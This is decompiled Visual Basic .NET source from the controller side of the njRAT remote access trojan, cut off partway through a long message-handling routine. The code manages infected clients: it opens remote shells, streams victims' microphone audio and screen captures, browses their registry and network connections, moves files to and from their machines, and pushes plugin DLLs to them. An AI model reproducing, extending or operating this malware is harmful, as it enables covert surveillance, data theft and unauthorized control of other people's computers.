Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My
Imports NJRAT.My.Resources
Imports NJRAT.njRAT
Imports WinMM

Namespace NJRAT
	' Token: 0x02000027 RID: 39
	Friend NotInheritable Module Class7
		' Token: 0x06000346 RID: 838 RVA: 0x0001DCBC File Offset: 0x0001BEBC
		Public Function smethod_0(string_2 As String, string_3 As String) As Class7.Class9
			Dim flag As Boolean = string_2 <> Nothing
			If flag Then
				Try
					For Each [class] As Class7.Class9 In Class7.list_1
						Dim flag2 As Boolean = Operators.CompareString([class].string_0, string_2.ToLower(), False) = 0
						If flag2 Then
							Return [class]
						End If
					Next
				Finally
					Dim enumerator As List(Of Class7.Class9).Enumerator
					enumerator.Dispose()
				End Try
			End If
			Dim flag3 As Boolean = string_3 <> Nothing
			If flag3 Then
				Try
					For Each class2 As Class7.Class9 In Class7.list_1
						Dim flag4 As Boolean = Operators.CompareString(class2.string_1, string_3, False) = 0
						If flag4 Then
							Return class2
						End If
					Next
				Finally
					Dim enumerator2 As List(Of Class7.Class9).Enumerator
					enumerator2.Dispose()
				End Try
			End If
			Return Nothing
		End Function

		' Token: 0x06000347 RID: 839 RVA: 0x0001DDA4 File Offset: 0x0001BFA4
		Public Function smethod_1(dataGridViewRow_0 As DataGridViewRow) As Object
			Dim result As Object
			Try
				result = RuntimeHelpers.GetObjectValue(If((dataGridViewRow_0 IsNot Nothing), If((dataGridViewRow_0.Tag IsNot Nothing), Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("[", RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells(Class7.int_0).Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells(Class7.int_3).Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells(Class7.int_7).Value))), "]"), "?"), "?"))
			Catch ex As Exception
				result = "?"
			End Try
			Return result
		End Function

		' Token: 0x06000348 RID: 840 RVA: 0x0001DEAC File Offset: 0x0001C0AC
		Public Function smethod_2(client_0 As Client, class9_0 As Class7.Class9, bool_1 As Boolean) As Boolean
			Try
				Dim text As String
				If bool_1 Then
					text = "ret" + Class7.string_1 + class9_0.string_1 + Class7.string_1
				Else
					text = String.Concat(New String() { "inv", Class7.string_1, class9_0.string_1, Class7.string_1, client_0.ip(), Class7.string_1 })
				End If
				Dim memoryStream As MemoryStream = New MemoryStream()
				memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
				Dim flag As Boolean = Not client_0.plg.Contains(class9_0.string_1)
				If flag Then
					memoryStream.Write(class9_0.byte_0, 0, class9_0.byte_0.Length)
				Else
					memoryStream.WriteByte(40)
				End If
				client_0.Send(memoryStream.ToArray())
				Return True
			Catch ex As Exception
			End Try
			Return False
		End Function

		' Token: 0x06000349 RID: 841 RVA: 0x0001DFBC File Offset: 0x0001C1BC
		Public Function smethod_3(string_2 As String) As Form
			Return MyProject.Application.OpenForms(string_2)
		End Function

		' Token: 0x0600034A RID: 842 RVA: 0x0001DFE0 File Offset: 0x0001C1E0
		Public Sub smethod_4(object_0 As Object)
			Dim enumerator As IEnumerator = Class7.form1_0.L1.SelectedRows.GetEnumerator()
			enumerator.Reset()
			Dim flag As Boolean = TypeOf NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { 0 }, Nothing)Is String
			Dim b As Byte()
			If flag Then
				Dim text As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { 0 }, Nothing)))
				Dim array As Byte() = Class6.smethod_11(text)
				NewLateBinding.LateIndexSetComplex(RuntimeHelpers.GetObjectValue(object_0), New Object() { 0, text }, Nothing, True, False)
				b = array
			Else
				b = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { 0 }, Nothing), Byte())
			End If
			While enumerator.MoveNext()
				Dim obj As Object = enumerator.Current
				Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
				CType(dataGridViewRow.Tag, Client).Send(b)
				Dim defaultCellStyle As DataGridViewCellStyle = dataGridViewRow.DefaultCellStyle
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { 1 }, Nothing))
				Dim color As Color
				If objectValue Is Nothing Then
					Dim color2 As Color
					color = color2
				Else
					Dim obj2 As Object = objectValue
					color = If((obj2 IsNot Nothing), CType(obj2, Color), Nothing)
				End If
				Dim foreColor As Color = color
				defaultCellStyle.ForeColor = foreColor
			End While
		End Sub

		' Token: 0x0600034B RID: 843 RVA: 0x0001E134 File Offset: 0x0001C334
		Public Sub smethod_5(object_0 As Object)
			Dim client As Client = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { 0 }, Nothing), Client)
			Dim array As Byte() = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { 1 }, Nothing), Byte())
			Dim array2 As String() = Strings.Split(Class6.smethod_12(array), Class7.string_1, -1, CompareMethod.Binary)
			Try
				Dim left As String = array2(0)
				Dim flag As Boolean = Operators.CompareString(left, "Ex", False) = 0
				If flag Then
					Dim manager As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
					Dim flag2 As Boolean = manager Is Nothing
					If Not flag2 Then
						manager.SL.Text = array2(1)
						Dim flag3 As Boolean = Not array2(1).StartsWith("rs:!-->")
						If Not flag3 Then
							manager.shStarted = 0
						End If
					End If
				Else
					Dim flag4 As Boolean = Operators.CompareString(left, "srv", False) = 0
					If flag4 Then
						Dim manager2 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
						Dim flag5 As Boolean = manager2 Is Nothing OrElse Operators.CompareString(array2(1), "~", False) <> 0
						If Not flag5 Then
							Dim list As List(Of String) = New List(Of String)()
							Dim list2 As List(Of ListViewItem) = New List(Of ListViewItem)()
							Dim num As Integer = 2
							Dim num2 As Integer = array2.Length - 1
							For i As Integer = num To num2
								Dim array3 As String() = Strings.Split(array2(i), "[,]", -1, CompareMethod.Binary)
								list.Add(array3(0).ToLower())
								Dim flag6 As Boolean = manager2.LSRV.Items.ContainsKey(array3(0))
								If flag6 Then
									Dim listViewItem As ListViewItem = manager2.LSRV.Items(array3(0))
									listViewItem.SubItems(3).Text = array3(3)
									listViewItem.SubItems(4).Text = array3(4)
								Else
									Dim listViewItem2 As ListViewItem = New ListViewItem(array3(0))
									Dim num3 As Integer = 1
									Dim num4 As Integer = array3.Length - 1
									For j As Integer = num3 To num4
										listViewItem2.SubItems.Add(array3(j))
									Next
									listViewItem2.Name = array3(0)
									list2.Add(listViewItem2)
									Dim flag7 As Boolean = list2.Count > 20
									If flag7 Then
										manager2.LSRV.Items.AddRange(list2.ToArray())
										list2.Clear()
									End If
								End If
							Next
							Dim flag8 As Boolean = list2.Count > 0
							If flag8 Then
								manager2.LSRV.Items.AddRange(list2.ToArray())
								list2.Clear()
							End If
							Dim list3 As List(Of String) = New List(Of String)()
							Try
								Try
									For Each obj As Object In manager2.LSRV.Items
										Dim listViewItem3 As ListViewItem = CType(obj, ListViewItem)
										Dim flag9 As Boolean = Not list.Contains(listViewItem3.Text.ToLower())
										If flag9 Then
											list3.Add(listViewItem3.Text)
										End If
									Next
								Finally
									Dim enumerator As IEnumerator
									If TypeOf enumerator Is IDisposable Then
										TryCast(enumerator, IDisposable).Dispose()
									End If
								End Try
							Finally
								Dim enumerator2 As IEnumerator
								Dim flag10 As Boolean = TypeOf enumerator2 Is IDisposable
								If flag10 Then
									TryCast(enumerator2, IDisposable).Dispose()
								End If
							End Try
							Try
								For Each key As String In list3
									manager2.LSRV.Items.RemoveByKey(key)
								Next
							Finally
								Dim enumerator3 As List(Of String).Enumerator
								enumerator3.Dispose()
							End Try
							manager2.srvNxt = True
							Dim flag11 As Boolean = Not manager2.SrvFX
							If Not flag11 Then
								manager2.SrvFX = False
								manager2.LSRV.method_3()
							End If
						End If
					Else
						Dim flag12 As Boolean = Operators.CompareString(left, "tcp", False) = 0
						If flag12 Then
							Dim manager3 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
							Dim flag13 As Boolean = manager3 Is Nothing
							If Not flag13 Then
								Dim pr As ToolStripProgressBar = manager3.pr
								SyncLock pr
									Dim left2 As String = array2(1)
									Dim flag14 As Boolean = Operators.CompareString(left2, "~", False) = 0
									If flag14 Then
										Dim array4 As String() = Strings.Split(array2(2), "*", -1, CompareMethod.Binary)
										manager3.pr.Value = 0
										manager3.pr.Maximum = array4.Length
										Dim list4 As List(Of ListViewItem) = New List(Of ListViewItem)()
										Dim num5 As Integer = 0
										Dim num6 As Integer = array4.Length - 1
										For k As Integer = num5 To num6
											Dim array5 As String() = Strings.Split(array4(k), ",", -1, CompareMethod.Binary)
											Dim flag15 As Boolean = manager3.LTCP.Items.ContainsKey(array5(0) + array5(1))
											If flag15 Then
												Dim listViewItem4 As ListViewItem = manager3.LTCP.Items(array5(0) + array5(1))
												listViewItem4.SubItems(4).Text = CType(Conversions.ToInteger(array5(2)), TcpState).ToString()
												Dim foreColor As Color = listViewItem4.ForeColor
												Select Case Conversions.ToInteger(array5(2))
													Case 1, 8, 9, 11, 12
														listViewItem4.ForeColor = Color.Red
													Case 4
														listViewItem4.ForeColor = Color.YellowGreen
													Case 5
														listViewItem4.ForeColor = Color.LimeGreen
												End Select
											Else
												Dim listViewItem5 As ListViewItem = New ListViewItem(array5(0).Split(New Char() { ":"c })(0))
												listViewItem5.Name = array5(0) + array5(1)
												listViewItem5.Tag = array5(0) + array5(1)
												listViewItem5.SubItems.Add(array5(0).Split(New Char() { ":"c })(1))
												listViewItem5.SubItems.Add(array5(1).Split(New Char() { ":"c })(0))
												listViewItem5.SubItems.Add(array5(1).Split(New Char() { ":"c })(1))
												listViewItem5.SubItems.Add(CType(Conversions.ToInteger(array5(2)), TcpState).ToString())
												listViewItem5.SubItems.Add(array5(3))
												Select Case Conversions.ToInteger(array5(2))
													Case 1, 8, 9, 11, 12
														listViewItem5.ForeColor = Color.Red
													Case 3, 4
														listViewItem5.ForeColor = Color.YellowGreen
													Case 5
														listViewItem5.ForeColor = Color.LimeGreen
												End Select
												list4.Add(listViewItem5)
												Dim flag16 As Boolean = list4.Count > 20
												If flag16 Then
													manager3.LTCP.Items.AddRange(list4.ToArray())
													list4.Clear()
													Dim columnHeader_ As ColumnHeader = manager3.LTCP.columnHeader_0
													Dim flag17 As Boolean = columnHeader_ Is Nothing
													If flag17 Then
														manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(0))
													Else
														columnHeader_.Tag = RuntimeHelpers.GetObjectValue(If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "+", False)), If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "-", False)), "-", "+"), "-"))
														manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(columnHeader_.Index))
													End If
												End If
											End If
										Next
										Dim tcpfx As Boolean = manager3.TCPFX
										If tcpfx Then
											manager3.LTCP.method_3()
											manager3.TCPFX = False
										End If
										Dim flag18 As Boolean = list4.Count > 0
										If flag18 Then
											manager3.LTCP.Items.AddRange(list4.ToArray())
											list4.Clear()
											Dim columnHeader_2 As ColumnHeader = manager3.LTCP.columnHeader_0
											Dim flag19 As Boolean = columnHeader_2 Is Nothing
											If flag19 Then
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(0))
											Else
												columnHeader_2.Tag = RuntimeHelpers.GetObjectValue(If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "+", False)), If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "-", False)), "-", "+"), "-"))
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(columnHeader_2.Index))
											End If
										End If
										manager3.TCPNXT = True
									Else
										Dim flag20 As Boolean = Operators.CompareString(left2, "RM", False) = 0
										If flag20 Then
											Dim num7 As Integer = 2
											Dim num8 As Integer = array2.Length - 1
											For l As Integer = num7 To num8
												manager3.LTCP.Items.RemoveByKey(array2(l))
											Next
										Else
											Dim flag21 As Boolean = Operators.CompareString(left2, "ER", False) <> 0
											If Not flag21 Then
												manager3.SL.Text = array2(2)
											End If
										End If
									End If
								End SyncLock
							End If
						Else
							Dim flag22 As Boolean = Operators.CompareString(left, "MIC", False) = 0
							If flag22 Then
								Dim flag23 As Boolean = client.osk Is Nothing
								If flag23 Then
									client.isPL = True
									Try
										client.osk = Class7.sk_0.GetClient(array2(1))
									Catch ex As Exception
										client.CN = False
									End Try
								End If
								Dim invokeRequired As Boolean = Class7.form1_0.InvokeRequired
								If invokeRequired Then
									Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(object_0) })
								Else
									Dim mic As Mic = CType(Class7.smethod_3("mic" + client.ip()), Mic)
									Dim left3 As String = array2(2)
									Dim flag24 As Boolean = Operators.CompareString(left3, "~", False) = 0
									If flag24 Then
										Dim flag25 As Boolean = mic IsNot Nothing
										If Not flag25 Then
											Dim mic2 As Mic = New Mic()
											mic2.Name = "mic" + client.ip()
											mic2.sk = client
											mic2.osk = client.osk
											Dim num9 As Integer = 3
											Dim num10 As Integer = array2.Length - 1
											For m As Integer = num9 To num10
												mic2.ComboBox1.Items.Add(array2(m))
											Next
											mic2.Show()
										End If
									Else
										Dim flag26 As Boolean = Operators.CompareString(left3, "!", False) = 0
										If flag26 Then
											Dim flag27 As Boolean = mic Is Nothing
											If flag27 Then
												client.CN = False
											Else
												Dim array6 As Byte() = CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(3) + Class7.string_1), New Object() { 1 }, Nothing), Byte())
												Dim flag28 As Boolean = array6(0) = 31
												If flag28 Then
													Dim byte_ As Byte() = array6
													Dim flag29 As Boolean = False
													Dim flag30 As Boolean = flag29
													array6 = Class6.smethod_8(byte_, flag30)
												End If
												mic.Text = Class6.smethod_17(CLng(array6.Length)) + " " + mic.QQ
												Dim flag31 As Boolean = Conversions.ToInteger(array2(3)) = 0
												If flag31 Then
													Class7.waveOut_0.Write(array6)
												Else
													Class7.waveOut_1.Write(array6)
												End If
											End If
										Else
											Dim flag32 As Boolean = Operators.CompareString(left3, "ER", False) <> 0
											If Not flag32 Then
												Dim flag33 As Boolean = mic Is Nothing
												If flag33 Then
													client.CN = False
												Else
													mic.ComboBox1.Enabled = True
													mic.ComboBox2.Enabled = True
													mic.Button1.Text = "Start"
												End If
											End If
										End If
									End If
								End If
							Else
								Dim flag34 As Boolean = Operators.CompareString(left, "get", False) = 0
								If flag34 Then
									client.isPL = True
									client.t.Dispose()
									client.CN = False
									client.NoPing = True
									Dim up As up = CType(Class7.smethod_3(array2(1) + array2(2)), up)
									Dim flag35 As Boolean = up Is Nothing
									If flag35 Then
										client.Close()
									Else
										up.sk = client
										Dim num11 As Integer = 0
										client.Client.SendBufferSize = 524288
										Try
											While num11 <> up.SZ
												Dim flag36 As Boolean = Not up.Closinge
												If Not flag36 Then
													GoTo IL_E09
												End If
												Dim array7 As Byte() = New Byte(10240) {}
												Dim num12 As Integer = up.FS.Read(array7, 0, array7.Length)
												client.Client.Client.Poll(-1, SelectMode.SelectWrite)
												client.Client.Client.Send(array7, 0, num12, SocketFlags.None)
												num11 += num12
												Class7.long_0 += CLng(num12)
												Dim progressBar As ProgressBar = up.ProgressBar1
												progressBar.Value += num12
											End While
											up.Close()
										Catch ex2 As Exception
											Try
												up.Text = "Connection lost"
												up.Lv1.ForeColor = Color.Red
											Catch ex3 As Exception
											End Try
										End Try
										IL_E09:
										client.Close()
									End If
								Else
									Dim flag37 As Boolean = Operators.CompareString(left, "post+", False) = 0
									If flag37 Then
										client.isPL = True
										Dim dw As DW = New DW()
										dw.FN = array2(1)
										dw.SZ = Conversions.ToInteger(array2(2))
										dw.c = client
										dw.osk = client.osk
										dw.Name = dw.osk.ip() + array2(1)
										dw.Show()
									Else
										Dim flag38 As Boolean = Operators.CompareString(left, "post", False) = 0
										If flag38 Then
											client.osk = Class7.sk_0.GetClient(array2(3))
											Try
												client.t.Dispose()
												client.CN = False
												client.NoPing = True
												Dim objectValue As Object = RuntimeHelpers.GetObjectValue(object_0)
												Dim array8 As Object() = New Object(1) {}
												array8(0) = 1
												Dim array9 As Object() = array8
												Dim array10 As Object() = array9
												Dim num13 As Integer = 1
												Dim text As String = String.Concat(New String() { "post+", Class7.string_1, array2(1), Class7.string_1, array2(2), Class7.string_1, array2(3) })
												Dim array11 As Byte() = Class6.smethod_11(text)
												array10(num13) = array11
												Dim arguments As Object() = array9
												Dim obj2 As Object = Nothing
												NewLateBinding.LateIndexSet(RuntimeHelpers.GetObjectValue(objectValue), arguments, CType(obj2, String()))
												Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(object_0) })
												Dim num14 As Integer = 0
												While Class7.smethod_3(array2(3) + array2(1)) Is Nothing
													num14 += 1
													Dim flag39 As Boolean = num14 = 1000
													If flag39 Then
														Return
													End If
													Thread.Sleep(10)
												End While
												Dim client2 As Socket = client.Client.Client
												text = "ok"
												Dim buffer As Byte() = Class6.smethod_11(text)
												Dim offset As Integer = 0
												Dim size As Integer = 2
												Dim socketFlags As Integer = 0
												client2.Send(buffer, offset, size, CType(socketFlags, SocketFlags))
												client.Client.Client.ReceiveBufferSize = 1048576
												Class7.long_0 += 2L
												Dim array12 As Byte() = New Byte(1024) {}
												Dim dw2 As DW = CType(Class7.smethod_3(array2(3) + array2(1)), DW)
												Dim num15 As Integer = 0
												Try
													While True
														Dim array13 As Byte() = New Byte(1048576) {}
														client.Client.Client.Poll(-1, SelectMode.SelectRead)
														Dim num16 As Integer = client.Client.Client.Receive(array13, 0, array13.Length, SocketFlags.None)
														dw2.FS.Write(array13, 0, num16)
														Class7.long_1 += CLng(num16)
														num15 += num16
														Dim progressBar2 As ProgressBar = dw2.ProgressBar1
														progressBar2.Value += num16
														dw2.FS.Flush()
														Dim flag40 As Boolean = num15 <> dw2.SZ
														If Not flag40 Then
															Exit For
														End If
														Thread.Sleep(1)
													End While
													dw2.Button1.Enabled = False
													dw2.FS.Close()
													dw2.FS.Dispose()
													Dim flag41 As Boolean = File.Exists(dw2.folder)
													If flag41 Then
														File.Delete(dw2.folder)
													End If
													File.Move(dw2.tmp, dw2.folder)
													dw2.Close()
												Catch ex4 As Exception
													dw2.Text = "connection lost"
													dw2.ForeColor = Color.Red
												End Try
											Catch ex5 As Exception
											End Try
											client.Close()
										Else
											Dim flag42 As Boolean = Operators.CompareString(left, "RG", False) = 0
											If flag42 Then
												Dim invokeRequired2 As Boolean = Class7.form1_0.InvokeRequired
												If invokeRequired2 Then
													Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(object_0) })
												Else
													Dim manager4 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
													Dim pr2 As ToolStripProgressBar = manager4.pr
													SyncLock pr2
														Dim left4 As String = array2(1)
														Dim flag43 As Boolean = Operators.CompareString(left4, "ER", False) = 0
														If flag43 Then
															manager4.RGk.Enabled = True
															manager4.RGLIST.Enabled = True
															manager4.SL.Text = Class6.smethod_16(array2(2))
														Else
															Dim flag44 As Boolean = Operators.CompareString(left4, "~", False) <> 0
															If Not flag44 Then
																manager4.RGk.Enabled = True
																manager4.RGLIST.Enabled = True
																Dim nodes As TreeNodeCollection = manager4.RGk.Nodes
																Dim treeNode As TreeNode = Class6.smethod_7(array2(2), manager4.RGk.Nodes)
																Dim list5 As List(Of String) = New List(Of String)()
																Dim flag45 As Boolean = manager4.RGk.SelectedNode Is treeNode
																If flag45 Then
																	manager4.RGLIST.Items.Clear()
																End If
																Dim flag46 As Boolean = manager4.RGCH.Contains(array2(2))
																Dim gclass As Manager.GClass13
																If flag46 Then
																	gclass = CType(manager4.RGCH(array2(2)), Manager.GClass13)
																	gclass.list_0.Clear()
																	gclass.list_1.Clear()
																Else
																	gclass = New Manager.GClass13()
																	gclass.string_0 = array2(2)
																	manager4.RGCH.Add(gclass, array2(2), Nothing, Nothing)
																End If
																Dim array14 As String() = Strings.Split(array2(3), "[,]", -1, CompareMethod.Binary)
																manager4.pr.Value = 0
																manager4.pr.Maximum = array14.Length
																For Each text2 As String In array14
																	Dim flag47 As Boolean = Operators.CompareString(text2, String.Empty, False) <> 0
																	If flag47 Then
																		Dim array16 As String() = Strings.Split(text2, "[;]", -1, CompareMethod.Binary)
																		Try
																			Dim pr3 As ToolStripProgressBar = manager4.pr
																			pr3.Value += 1
																			Dim flag48 As Boolean = array16.Length > 1
																			If flag48 Then
																				Dim flag49 As Boolean = manager4.RGk.SelectedNode Is treeNode
																				If flag49 Then
																					Dim listViewItem6 As ListViewItem = manager4.RGLIST.Items.Add(array16(0))
																					listViewItem6.SubItems.Add(array16(1))
																					listViewItem6.SubItems.Add(array16(2))
																					listViewItem6.ImageIndex = If((Operators.CompareString(array16(1), "String", False) <> 0), 2, 1)
																				End If
																				gclass.list_0.Add(array16)
																			Else
																				gclass.list_1.Add(array16(0))
																				treeNode.Nodes.Add(array16(0), array16(0))
																				Dim flag50 As Boolean = Not treeNode.Nodes.ContainsKey(array16(0))
																				If flag50 Then
																					list5.Add(array16(0))
																				End If
																			End If
																		Catch ex6 As Exception
																		End Try
																	End If
																Next
																Try
																	Try
																		For Each obj3 As Object In treeNode.Nodes
																			Dim treeNode2 As TreeNode = CType(obj3, TreeNode)
																			Dim flag51 As Boolean = list5.Contains(treeNode2.Text)
																			If flag51 Then
																				list5.Remove(treeNode2.Text)
																			End If
																		Next
																	Finally
																		Dim enumerator4 As IEnumerator
																		If TypeOf enumerator4 Is IDisposable Then
																			TryCast(enumerator4, IDisposable).Dispose()
																		End If
																	End Try
																Finally
																	Dim enumerator5 As IEnumerator
																	Dim flag52 As Boolean = TypeOf enumerator5 Is IDisposable
																	If flag52 Then
																		TryCast(enumerator5, IDisposable).Dispose()
																	End If
																End Try
																Try
																	For Each key2 As String In list5
																		treeNode.Nodes.RemoveByKey(key2)
																	Next
																Finally
																	Dim enumerator6 As List(Of String).Enumerator
																	enumerator6.Dispose()
																End Try
																Dim flag53 As Boolean = treeNode Is manager4.RGk.SelectedNode
																If flag53 Then
																	treeNode.Expand()
																End If
																manager4.RGLIST.method_3()
																manager4.pr.Value = 0
															End If
														End If
													End SyncLock
												End If
											Else
												Dim flag54 As Boolean = Operators.CompareString(left, "rss", False) = 0
												If flag54 Then
													Dim manager5 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
													Dim flag55 As Boolean = manager5 Is Nothing
													If Not flag55 Then
														manager5.shStarted = 2
														manager5.T2.[ReadOnly] = False
														manager5.T2.BackColor = Color.Black
													End If
												Else
													Dim flag56 As Boolean = Operators.CompareString(left, "rs", False) = 0
													If flag56 Then
														Dim manager6 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
														Dim flag57 As Boolean = manager6 Is Nothing
														If Not flag57 Then
															Dim t As RichTextBox = manager6.T1
															SyncLock t
																manager6.T1.SelectionStart = manager6.T1.TextLength
																manager6.T1.AppendText(Class6.smethod_16(array2(1).Replace(vbCrLf, String.Empty)) + vbCrLf)
																manager6.T1.SelectionStart = manager6.T1.TextLength
																manager6.T1.ScrollToCaret()
															End SyncLock
														End If
													Else
														Dim flag58 As Boolean = Operators.CompareString(left, "rsc", False) = 0
														If flag58 Then
															Dim manager7 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
															Dim flag59 As Boolean = manager7 Is Nothing
															If Not flag59 Then
																manager7.T2.[ReadOnly] = True
																manager7.T2.BackColor = Color.Gray
																manager7.shStarted = 0
															End If
														Else
															Dim flag60 As Boolean = Operators.CompareString(left, "PLG", False) = 0
															If flag60 Then
																Dim [class] As Class7.Class9 = Class7.smethod_0("plg.dll", Nothing)
																Dim memoryStream As MemoryStream = New MemoryStream()
																Dim text3 As String = "PLG" + Class7.string_1
																Dim array17 As Byte() = Class6.smethod_11(text3)
																memoryStream.Write(array17, 0, array17.Length)
																memoryStream.Write([class].byte_0, 0, [class].byte_0.Length)
																client.Send(memoryStream.ToArray())
															Else
																Dim flag61 As Boolean = Operators.CompareString(left, "sc~", False) = 0
																If flag61 Then
																	Dim flag62 As Boolean = client.osk Is Nothing
																	If flag62 Then
																		client.isPL = True
																		Try
																			client.osk = Class7.sk_0.GetClient(array2(1))
																		Catch ex7 As Exception
																			client.CN = False
																		End Try
																	End If
																	Dim invokeRequired3 As Boolean = Class7.form1_0.InvokeRequired
																	If invokeRequired3 Then
																		Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(object_0) })
																	Else
																		Dim flag63 As Boolean = CType(Class7.smethod_3("sc" + client.ip()), sc) IsNot Nothing
																		If Not flag63 Then
																			Dim sc As sc = New sc()
																			sc.osk = client.osk
																			sc.sz = New Size(Conversions.ToInteger(array2(2)), Conversions.ToInteger(array2(3)))
																			sc.p.Image = Nothing
																			sc.Oimg = New Bitmap(sc.sz.Width, sc.sz.Height, PixelFormat.Format32bppPArgb)
																			sc.sk = client
																			sc.Name = "sc" + client.ip()
																			sc.Show()
																		End If
																	End If
																Else
																	Dim flag64 As Boolean = Operators.CompareString(left, "scPK", False) = 0
																	If flag64 Then
																		Dim sc2 As sc = CType(Class7.smethod_3("sc" + array2(1)), sc)
																		Dim flag65 As Boolean = sc2 Is Nothing
																		If flag65 Then
																			client.CN = False
																		Else
																			Dim obj4 As sc = sc2
																			SyncLock obj4
																				Dim sc3 As sc = sc2
																				sc3.fps += 1
																				sc2.pkt = CLng(array.Length)
																				Dim flag66 As Boolean = array2(2).Length = 0
																				If Not flag66 Then
																					Dim bitmap As Bitmap = CType(Image.FromStream(New MemoryStream(CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(2) + Class7.string_1), New Object() { 1 }, Nothing), Byte()))), Bitmap)
																					Dim flag67 As Boolean = bitmap.Width = 0
																					If Not flag67 Then
																						Dim array18 As String() = Strings.Split(array2(2), "-", -1, CompareMethod.Binary)
																						Dim array19 As String() = Strings.Split(array18(0), ",", -1, CompareMethod.Binary)
																						Dim sz As Size = New Size(Conversions.ToInteger(array19(0)), Conversions.ToInteger(array19(1)))
																						Dim num17 As Integer = Conversions.ToInteger(array18(1))
																						Dim flag68 As Boolean = sc2.Oimg.Size <> sz
																						If flag68 Then
																							sc2.Oimg = New Bitmap(sz.Width, sz.Height, PixelFormat.Format32bppPArgb)
																						End If
																						Dim format As PixelFormat = PixelFormat.Format32bppArgb
																						Dim num18 As Integer = 0
																						Dim num19 As Integer = 2
																						Dim num20 As Integer = array18.Length - 1
																						For num21 As Integer = num19 To num20
																							Dim array20 As String() = Strings.Split(array18(num21), ",", -1, CompareMethod.Binary)
																							Dim rect As Rectangle = New Rectangle(Conversions.ToInteger(array20(0)), Conversions.ToInteger(array20(1)), bitmap.Width, num17)
																							Dim bitmapData As BitmapData = sc2.Oimg.LockBits(rect, ImageLockMode.[WriteOnly], format)
																							Dim bitmapData2 As BitmapData = bitmap.LockBits(New Rectangle(0, num18, rect.Width, rect.Height), ImageLockMode.[ReadOnly], format)
																							Dim array21 As Byte() = New Byte(Math.Abs(bitmapData.Stride) * bitmapData.Height - 1 + 1 - 1 + 1 - 1) {}
																							Class6.memcpy(bitmapData.Scan0, bitmapData2.Scan0, array21.Length)
																							sc2.Oimg.UnlockBits(bitmapData)
																							bitmap.UnlockBits(bitmapData2)
																							num18 += num17
																						Next
																						sc2.p.Image = CType(sc2.Oimg.Clone(), Image)
																						Dim flag69 As Boolean = Not sc2.CheckBox3.Checked
																						If Not flag69 Then
																							Try
																								sc2.Oimg.Save(sc2.Folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg)
																							Catch ex8 As Exception
																							End Try
																						End If
																					End If
																				End If
																			End SyncLock
																		End If
																	Else
																		Dim flag70 As Boolean = Operators.CompareString(left, "CH", False) = 0
																		If flag70 Then
																			Dim flag71 As Boolean = client.osk Is Nothing
																			If flag71 Then
																				client.isPL = True
																				Try
																					client.osk = Class7.sk_0.GetClient(array2(1))
																				Catch ex9 As Exception
																					client.CN = False
																				End Try
																			End If
																			Dim invokeRequired4 As Boolean = Class7.form1_0.InvokeRequired
																			If invokeRequired4 Then
																				Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(object_0) })
																			Else
																				Dim chat As Chat = CType(Class7.smethod_3("ch" + client.ip()), Chat)
																				Dim left5 As String = array2(2)
																				Dim flag72 As Boolean = Operators.CompareString(left5, "~", False) = 0
																				If flag72 Then
																					Dim flag73 As Boolean = chat IsNot Nothing
																					If Not flag73 Then
																						New Chat() With { .Name = "ch" + client.ip(), .sk = client, .osk = client.osk, .T2 = { .Enabled = False }, .Button1 = { .Enabled = False } }.Show()
																					End If
																				Else
